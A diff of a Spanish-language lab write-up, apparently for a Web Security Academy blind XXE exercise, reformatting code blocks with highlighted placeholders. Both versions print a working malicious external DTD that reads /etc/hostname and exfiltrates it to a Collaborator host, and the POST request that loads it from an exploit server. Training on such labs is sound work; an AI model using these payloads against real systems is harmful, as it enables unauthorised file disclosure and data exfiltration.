@@ -21,12 +21,13 @@ tags:
 ## Cómo explotarlo (3 partes)
 
 ### 1. El DTD malicioso — qué debe contener
-```dtd
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.oastify.com/?x=%file;'>">
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
+
+<pre><code>&lt;!ENTITY % file SYSTEM "<mark>file:///etc/hostname</mark>"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://<mark>COLLAB.oastify.com</mark>/?x=%file;'&gt;"&gt;
 %eval;
-%exfil;
-```
+%exfil;</code></pre>
 - `%file` → **lee** el archivo.
 - `%eval` → declara **dinámicamente** `%exfil`. Necesita `&#x25;` = **`%` escapado**.
 - `%exfil` → pide `http://COLLAB/?x=<contenido>` → **exfiltración**.
@@ -37,15 +38,13 @@ tags:
 - "View exploit" → copiá `https://EXPLOIT.exploit-server.net/exploit.dtd`.
 
 ### 3. La request que carga el DTD externo
-```http
-POST /product/stock HTTP/1.1
-Host: TARGET.web-security-academy.net
+<pre><code>POST /product/stock HTTP/1.1
+Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://EXPLOIT.exploit-server.net/exploit.dtd"> %xxe;]>
-<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
-```
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "https://<mark>EXPLOIT.exploit-server.net</mark>/exploit.dtd"&gt; %xxe;]&gt;
+&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;storeId&gt;1&lt;/storeId&gt;&lt;/stockCheck&gt;</code></pre>
 
 ## Verificación
 Burp → **Collaborator** → **Poll now** → la request **HTTP** trae el archivo en `?x=…`.
